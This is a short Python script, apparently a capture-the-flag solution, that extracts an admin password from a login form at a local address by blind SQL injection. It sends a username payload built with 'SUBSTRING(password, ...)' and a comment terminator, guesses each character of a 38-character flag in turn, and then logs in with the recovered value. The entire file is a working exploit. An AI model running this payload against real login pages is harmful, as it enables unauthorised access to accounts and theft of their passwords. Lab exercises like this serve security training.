from time import sleep
import requests
from charset_generator.yielding import yield_charset


FLAG_LENGTH = 38

URL = "http://127.0.0.1:5000"


def login(username, password):
    res = requests.post(
        f"{URL}/login", data={"username": username, "password": password})
    sleep(1)  # Simulate extra latency
    return res, res.text


def try_payload(payload):
    _, text = login(payload, "")
    return "Logged in!" in text


def gen_payload(known_flag):
    return f"Admin' AND SUBSTRING(password, 1, {len(known_flag)}) = '{known_flag}' --"


num_requests = 0
flag = ""
for i in range(FLAG_LENGTH):
    char_found = False
    for c in yield_charset("[!-~]", True, True):
        print("Trying char:", c)
        payload = gen_payload(flag + c)
        num_requests += 1
        if try_payload(payload):
            char_found = True
            flag += c
            print(flag)
            break
    assert char_found, "Failed to find character"

print(login("Admin", flag))
print("Number of requests:", num_requests)
